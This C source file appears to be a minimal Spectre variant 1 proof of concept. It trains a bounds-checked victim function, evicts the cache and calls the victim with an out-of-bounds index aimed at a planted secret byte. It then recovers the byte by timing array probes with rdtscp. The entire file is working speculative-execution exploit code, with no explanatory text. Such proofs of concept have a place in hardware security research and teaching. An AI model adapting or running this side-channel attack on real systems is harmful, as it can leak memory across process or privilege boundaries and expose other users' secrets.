#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

/* default: 64B line size, L1-D 64KB assoc 2, L1-I 32KB assoc 2, L2 2MB assoc 8 */
// generalise notes
#define LLC_SIZE (2 << 20)

uint8_t dummy[LLC_SIZE];
size_t array_size = 4;
uint8_t array1[200] = {1, 2, 3, 4};
uint8_t array2[256 * 64 * 2];
uint8_t X;

uint8_t victim(size_t idx)
{
	if (idx < array_size) {
		return array2[array1[idx] * 64];
	}
}

int main()
{
	unsigned long t[256];
	volatile uint8_t x;

	victim(0);
	victim(0);
	victim(0);
	victim(0);
	victim(0);

	memset(dummy, 1, sizeof(dummy)); // flush L2
	X = 123; // set the secret value, and also bring it to cache

	_mm_mfence();

	size_t attack_idx = &X - array1;
	victim(attack_idx);

	for (int i = 0; i < 256; i++) {
		unsigned int junk;
		unsigned long time1 = __rdtscp(&junk);
		x ^= array2[i * 64];
		unsigned long time2 = __rdtscp(&junk);
		t[i] = time2 - time1;
	}

	printf("attack_idx = %ld\n", attack_idx);
	for (int i = 0; i < 256; i++) {
		printf("%d: %d, %s\n", i, t[i], (t[i] < 40)? "hit": "miss");
	}
}